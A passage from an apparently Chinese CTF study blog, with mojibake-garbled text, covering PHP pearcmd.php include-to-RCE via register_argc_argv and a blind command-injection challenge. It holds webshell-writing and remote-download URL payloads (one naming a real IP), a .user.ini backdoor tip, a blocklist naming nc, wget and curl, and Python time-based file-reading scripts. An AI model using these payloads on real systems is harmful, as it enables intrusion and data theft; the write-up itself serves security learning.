·åœ¨register<em>argc</em>argvå¼€å¯çš„æƒ…å†µä¸‹æˆ‘ä»¬å°±æœ‰å¯èƒ½é€šè¿‡åŒ…å«pearcmd.phpä¸æ“æ§$_SERVER[â€˜argvâ€™]æ¥æ‰§è¡Œpearå‘½ä»¤</p><h3 id="pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½"><a href="#pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½" class="headerlink" title="pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½)"></a>pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#pearå‘½ä»¤ä»»æ„æ–‡ä»¶ä¸‹è½½)</h3><p>æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å¦‚ä½•é€šè¿‡pearå‘½ä»¤æ¥å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½:</p><ol><li><p>åœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªtmp.php<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082631-1700990443387-230.png"></p></li><li><p>ä½¿ç”¨pythonä¸€å¥è¯å¼€å¯httpæœåŠ¡å™¨:<code>python -m SimpleHTTPServer 8080</code></p></li><li><p>é€šè¿‡æ‰§è¡Œ<code>pear</code>å‘½ä»¤è·å–å¸®åŠ©,å‘ç°å­˜åœ¨downloadé€‰é¡¹,å°è¯•æ‰§è¡Œ<code>pear download http://127.0.0.1:8080/tmp.php</code>,å¯ä»¥çœ‹åˆ°å·²ç»æˆåŠŸåœ¨å½“å‰ç›®å½•ä¸‹è½½äº†tmp.php:<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082702-1700990443387-234.png"></p></li><li><p>æœ‰æ²¡æœ‰åŠæ³•æ§åˆ¶ä¸‹è½½ç›®å½•?ç­”æ¡ˆæ˜¯ä½¿ç”¨install -Rè€Œédownload,å°è¯•æ‰§è¡Œ<code>pear install -R /var/www/html http://127.0.0.1:8080/tmp.php</code></p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082751-1700990443387-232.png"></p></li><li><p>æˆåŠŸä¸‹è½½åˆ°webç›®å½•ä¸‹å¹¶èƒ½å¤Ÿè®¿é—®<br> <img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082843-1700990443387-231.png"></p></li></ol><h3 id="å¦‚ä½•æ§åˆ¶-SERVER-â€˜argvâ€™-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-å¦‚ä½•æ§åˆ¶-serverargv"><a href="#å¦‚ä½•æ§åˆ¶-SERVER-â€˜argvâ€™-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-å¦‚ä½•æ§åˆ¶-serverargv" class="headerlink" title="å¦‚ä½•æ§åˆ¶$_SERVER[â€˜argvâ€™][#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#å¦‚ä½•æ§åˆ¶_serverargv)"></a>å¦‚ä½•æ§åˆ¶$_SERVER[â€˜argvâ€™][#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#å¦‚ä½•æ§åˆ¶_serverargv)</h3><p>å¦‚ä½•å¾€$_SERVER[â€˜argvâ€™]ä¼ å…¥2ä¸ªæˆ–ä»¥ä¸Šçš„å‚æ•°?æµ‹è¯•ä¸€ä¸‹:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082904-1700990443387-235.png"></p><p>å¹¶ä¸èƒ½é€šè¿‡&amp;ä½œä¸º$_SERVER[â€˜argvâ€™]çš„åˆ†å‰²,é€šè¿‡æŸ¥é˜…èµ„æ–™å’Œé˜…è¯»æºç :</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082919-1700990443387-236.png"></p><p>main&#x2F;php_variables.c  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PHPAPI void php_build_argv(const char *s, zval *track_vars_array)</span><br><span class="line">&#123;</span><br><span class="line">zval arr, argc, tmp;</span><br><span class="line">int count = 0;</span><br><span class="line">if (!(SG(request_info).argc || track_vars_array)) &#123;</span><br><span class="line">return;</span><br><span class="line">&#125;</span><br><span class="line">array_init(&amp;arr);</span><br><span class="line">/* Prepare argv */</span><br><span class="line">if (SG(request_info).argc) &#123; /* are we in cli sapi? */</span><br><span class="line">int i;</span><br><span class="line">for (i = 0; i &lt; SG(request_info).argc; i++) &#123;</span><br><span class="line">ZVAL_STRING(&amp;tmp, SG(request_info).argv[i]);</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else if (s &amp;&amp; *s) &#123;</span><br><span class="line">while (1) &#123;</span><br><span class="line">const char *space = strchr(s, &#x27;+&#x27;);</span><br><span class="line">/* auto-type */</span><br><span class="line">ZVAL_STRINGL(&amp;tmp, s, space ? space - s : strlen(s));</span><br><span class="line">count++;</span><br><span class="line">if (zend_hash_next_index_insert(Z_ARRVAL(arr), &amp;tmp) == NULL) &#123;</span><br><span class="line">zend_string_efree(Z_STR(tmp));</span><br><span class="line">&#125;</span><br><span class="line">if (!space) &#123;</span><br><span class="line">break;</span><br><span class="line">&#125; s</span><br><span class="line">= space + 1;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŸ¥é“argvé€šè¿‡query_stringå–å€¼,å¹¶é€šè¿‡+ä½œä¸ºåˆ†å‰²ç¬¦,å°è¯•ä¸€ä¸‹:</p><p><img src="/2023/10/18/Pear%E5%91%BD%E4%BB%A4%E8%AF%BB%E6%96%87%E4%BB%B6/image/20210605082954-1700990443387-237.png"></p><h2 id="å›åˆ°é¢˜ç›®-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-å›åˆ°é¢˜ç›®"><a href="#å›åˆ°é¢˜ç›®-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-å›åˆ°é¢˜ç›®" class="headerlink" title="å›åˆ°é¢˜ç›®[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#å›åˆ°é¢˜ç›®)"></a>å›åˆ°é¢˜ç›®[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#å›åˆ°é¢˜ç›®)</h2><p>ç°åœ¨å›åˆ°é¢˜ç›®,æˆ‘ä»¬æ‰€æœ‰çš„æ‹¼å›¾å·²ç»å‡‘é½äº†,å‡å¦‚å­˜åœ¨ä»¥ä¸‹ç¯å¢ƒ:</p><ul><li>å®‰è£…äº†pear</li><li>å¼€å¯äº†register<em>argc</em>argv</li><li>å­˜åœ¨å¯æ§çš„<code>include $_GET[&#39;f&#39;]</code>(å³ä½¿æ˜¯<code>include $_GET[&#39;f&#39;].php</code>)</li></ul><p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸Šé¢çš„çŸ¥è¯†å®ç°ä»»æ„æ–‡ä»¶ä¸‹è½½ä»è€Œgetshell:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//é€šè¿‡æœ¬åœ°ç›´æ¥å†™å…¥webshell,æ³¨æ„è¿™é‡Œæœ€å¥½æŠ“åŒ…ç„¶åç”¨burpsuiteæˆ–è€…ç›´æ¥curlæ‰§è¡Œï¼Œå¦åˆ™æµè§ˆå™¨ä¼šå°†&lt; ? &gt; è½¬ä¹‰</span><br><span class="line">// config-createå¯ä»¥ç›´æ¥åˆ›å»ºé…ç½®æ–‡ä»¶ï¼Œä¸”ç¬¬ä¸€ä¸ªå‚æ•°å¿…é¡»ä»¥/å¼€å¤´</span><br><span class="line">http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</span><br><span class="line">// é€šè¿‡è¿œç¨‹ç›´æ¥ä¸‹è½½webshel</span><br><span class="line">// webç›®å½•å¯å†™</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/tmp/pear/download/evil.php</span><br><span class="line">// tmpç›®å½•å¯å†™</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/include.php?f=/tmp/pear/download/evil</span><br></pre></td></tr></table></figure><p>&amp;+install+-R+&#x2F;tmp+<a href="http://162.14.65.110:8888/1.php">http://162.14.65.110:8888/1.php</a></p><h2 id="åé—¨-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-åé—¨"><a href="#åé—¨-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-åé—¨" class="headerlink" title="åé—¨[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#åé—¨)"></a>åé—¨[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#åé—¨)</h2><p>å‰é¢æåˆ°register<em>argc</em>argvæ˜¯PHP INI PERDIRçš„,æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡æ–°å»ºä¸€ä¸ª.user.iniè®¾ç½®register<em>argc</em>argvä¸ºOnç”¨äºç•™åé—¨</p><h2 id="æœ€å-docker-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-æœ€ådocker"><a href="#æœ€å-docker-https-longlone-top-å®‰å…¨-å®‰å…¨ç ”ç©¶-register-argc-argvä¸include-to-RCEçš„å·§å¦™ç»„åˆ-æœ€ådocker" class="headerlink" title="æœ€å:docker[#](https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include to RCEçš„å·§å¦™ç»„åˆ&#x2F;#æœ€ådocker)"></a>æœ€å:docker[#](<a href="https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude">https://longlone.top/å®‰å…¨/å®‰å…¨ç ”ç©¶/register_argc_argvä¸include</a> to RCEçš„å·§å¦™ç»„åˆ&#x2F;#æœ€ådocker)</h2><p>åœ¨phpå®˜æ–¹æä¾›çš„é•œåƒä¸‹,é»˜è®¤æ˜¯ä¸ä½¿ç”¨php.iniçš„(åœ¨&#x2F;usr&#x2F;local&#x2F;etc&#x2F;phpä¸­å­˜åœ¨php.ini-productionå’Œphp.ini-development,éœ€è¦æ‰‹åŠ¨ä¿®æ”¹ä»»æ„ä¸€ä¸ªæ–‡ä»¶åä¸ºphp.iniæ‰ä¼šå¯åŠ¨php.ini,è€Œä¸Šé¢æˆ‘ä»¬æåˆ°åœ¨php.iniä¸­register<em>argc</em>argvéƒ½è®¾ç½®ä¸ºOff)</p><p>è€Œregister<em>argc</em>argvåœ¨ä¸è®¾ç½®çš„æƒ…å†µä¸‹é»˜è®¤ä¸ºOn,é‚£ä¹ˆå‡å¦‚æœ‰ä¸€ä¸ªé»˜è®¤çš„docker-phpç¯å¢ƒ,å¹¶å­˜åœ¨å¯æ§çš„<code>include $_GET[&#39;f&#39;]</code>(å³ä½¿æ˜¯include $_GET[â€˜fâ€™].php),æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´å®ç°getshell</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å‘½ä»¤æ³¨å…¥ç›²æ³¨è¯»å–æ–‡ä»¶</title>
      <link href="/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/"/>
      <url>/2023/10/17/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9B%B2%E6%B3%A8%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="å‘½ä»¤æ³¨å…¥ç›²æ³¨è¯»å–æ–‡ä»¶"><a href="#å‘½ä»¤æ³¨å…¥ç›²æ³¨è¯»å–æ–‡ä»¶" class="headerlink" title="å‘½ä»¤æ³¨å…¥ç›²æ³¨è¯»å–æ–‡ä»¶"></a>å‘½ä»¤æ³¨å…¥ç›²æ³¨è¯»å–æ–‡ä»¶</h1><p>è¿™å®é™…ä¸Šæ˜¯æœ‰2é“é¢˜ï¼Œä½†æ˜¯æºç ä¸€æ ·ï¼Œæƒé™ä¸ä¸€æ ·ã€‚</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$x</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$x</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;too young too simple sometimes naive!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">check</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¯ä»¥çœ‹åˆ°æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æ˜¯exec()ï¼Œè¿™ä¸ªå‡½æ•°å¹¶ä¸ä¼šå°†å‘½ä»¤æ‰§è¡Œåçš„ç»“æœå›æ˜¾å‡ºæ¥ï¼Œæ‰€ä»¥æ˜¯ä¸€ä¸ªæ— å›æ˜¾çš„å‘½ä»¤æ³¨å…¥ï¼Œä½†æ˜¯è¿™é‡Œè¿˜banäº†å¾ˆå¤šå‘½ä»¤å’Œç¬¦å·ï¼Œå¯¼è‡´äº†æˆ‘ä»¬æƒ³é€šè¿‡DNSLogå’ŒHTTPå¤–å¸¦ä»¥åŠåå¼¹shelléƒ½æ— æ³•å®ç°ã€‚<br>æœ‰å†™å…¥æƒé™</p><p>åœ¨æœ‰å†™å…¥æƒé™çš„æƒ…å†µä¸‹ï¼Œäº‹æƒ…å°±å˜å¾—ç®€å•äº†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨teeå‘½ä»¤</p><p>tee [OPTION]â€¦ [FILE]â€¦</p><p>ä»æ ‡å‡†è¾“å…¥è¯»å–æ•°æ®å¹¶é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºå’Œæ–‡ä»¶ã€‚</p><blockquote><p>example:</p><p>tee file1 file2      &#x2F;&#x2F;å°†è¾“å…¥çš„å†…å®¹è¦†ç›–åˆ°è¿™ä¸¤ä¸ªæ–‡ä»¶é‡Œé¢<br>ls|tee 1.txt          &#x2F;&#x2F;å°†lså‘½ä»¤çš„è¾“å‡ºæ˜¾ç¤ºå¹¶ä¿å­˜åˆ°1.txtæ–‡ä»¶ä¸­</p></blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‘½ä»¤å°†æ‰§è¡Œä¹‹åçš„ç»“æœå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼Œç„¶åå†è®¿é—®è¿™ä¸ªæ–‡ä»¶å³å¯ã€‚</p><blockquote><p>payload:</p><p>?c&#x3D;ls &#x2F;|tee 1.txt        &#x2F;&#x2F;è®¿é—®1.txtï¼Œå‘ç°æœ‰f149_15_h3r3æ–‡ä»¶<br>?c&#x3D;cat &#x2F;f149_15_h3r3|tee 2.txt        &#x2F;&#x2F;å†è®¿é—®2.txtå³å¯<br>æ²¡æœ‰å†™å…¥æƒé™</p></blockquote><p>æ²¡æœ‰å†™å…¥æƒé™å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œåªèƒ½é€šè¿‡sleepå‘½ä»¤æ ¹æ®æ‰§è¡Œæ—¶é—´æ¥è¿›è¡Œç›²æ³¨ã€‚</p><pre><code>é¦–å…ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡sleepå‘½ä»¤æ ¹æ®è¿”å›çš„æ—¶é—´æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨å‘½ä»¤æ‰§è¡Œæ¼æ´ã€‚</code></pre><p>?c&#x3D;sleep 5</p><p>å¯ä»¥å‘ç°ç½‘é¡µç­‰å¾…äº†5ç§’æ‰è¿”å›ç»“æœã€‚</p><pre><code>åˆ©ç”¨shellç¼–ç¨‹çš„ifåˆ¤æ–­è¯­å¥é…åˆawkä»¥åŠcutå‘½ä»¤æ¥è·å–flagawké€è¡Œè·å–æ•°æ®</code></pre><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag </span><br><span class="line">  hello</span><br><span class="line">  Flag&#123;success!!&#125;</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==1</span><br><span class="line">  hello</span><br><span class="line">  root@ubuntu:/# cat flag | awk NR==2</span><br><span class="line">  Flag&#123;success!!&#125;</span><br></pre></td></tr></table></figure></blockquote><pre><code>cutå‘½ä»¤é€åˆ—è·å–å•ä¸ªå­—ç¬¦</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# cat flag | awk NR==2 | cut -c 1</span><br><span class="line"> F</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 2</span><br><span class="line"> l</span><br><span class="line"> root@ubuntu:/# cat flag | awk NR==2 | cut -c 3</span><br><span class="line"> a</span><br></pre></td></tr></table></figure><blockquote><p>åˆ©ç”¨ifè¯­å¥æ¥åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œ</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 2) == l ];then echo &quot;right!&quot;;fi</span><br><span class="line">right!</span><br><span class="line">root@ubuntu:/# if [ $(cat flag | awk NR==2 | cut -c 1) == F ];then sleep 2;fi</span><br></pre></td></tr></table></figure><blockquote><p>ç”¨å‘½ä»¤ls \æŸ¥çœ‹æ ¹ç›®å½•æ¥è·å–flagæ–‡ä»¶å</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;xxxxx&quot;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">for i in range(1,5):</span><br><span class="line">    for j in range(1,15):</span><br><span class="line">        #asciiç è¡¨</span><br><span class="line">        for k in range(32,128):</span><br><span class="line">            k=chr(k)</span><br><span class="line">            payload = &quot;?c=&quot; + f&quot;if [ `ls / | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep 2;fi&quot;</span><br><span class="line">            try:</span><br><span class="line">                requests.get(url=url+payload, timeout=(1.5,1.5))</span><br><span class="line">            except:</span><br><span class="line">                result = result + k</span><br><span class="line">                print(result)</span><br><span class="line">                break</span><br><span class="line">    result += &quot; &quot;</span><br></pre></td></tr></table></figure><blockquote><p>å‘ç°ä¸€ä¸ªå«f149_15_h3r3çš„æ–‡ä»¶ï¼Œæ”¹ä»¥ä¸‹è„šæœ¬catä¸€ä¸‹</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;xxxx</span></span><br><span class="line"><span class="string">result = &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">for i in range(1,5):</span></span><br><span class="line"><span class="string">    for j in range(1,60):</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       for k in range(32,128):</span></span><br><span class="line"><span class="string">            k=chr(k)</span></span><br><span class="line"><span class="string">            payload = &quot;</span>?c=<span class="string">&quot; + f&quot;</span><span class="keyword">if</span> [ `cat /f149_15_h3r3 | awk NR==&#123;i&#125; | cut -c &#123;j&#125;` == &#123;k&#125; ];then sleep <span class="number">2</span>;fi<span class="string">&quot;</span></span><br><span class="line"><span class="string">            try:</span></span><br><span class="line"><span class="string">              requests.get(url=url+payload, timeout=(1.5,1.5))</span></span><br><span class="line"><span class="string">           except:</span></span><br><span class="line"><span class="string">               result = result + k</span></span><br><span class="line"><span class="string">              print(result)</span></span><br><span class="line"><span class="string">              break</span></span><br><span class="line"><span class="string">  result += &quot;</span> <span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæ˜¯getç‰ˆæœ¬çš„ï¼Œæœ€è¿‘åšäº†newstarï¼Œè€ƒäº†è¿™ä¸ªçŸ¥è¯†ç‚¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">minipop</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$qwejaskdjnlka</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|tee|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#x27;</span>, <span class="variable">$this</span>-&gt;code))&#123;</span><br><span class="line">            <span class="title function_ invoke__">exec</span>(<span class="variable">$this</span>-&gt;code);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;alright&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;qwejaskdjnlka;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//wanna try?</span></span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span 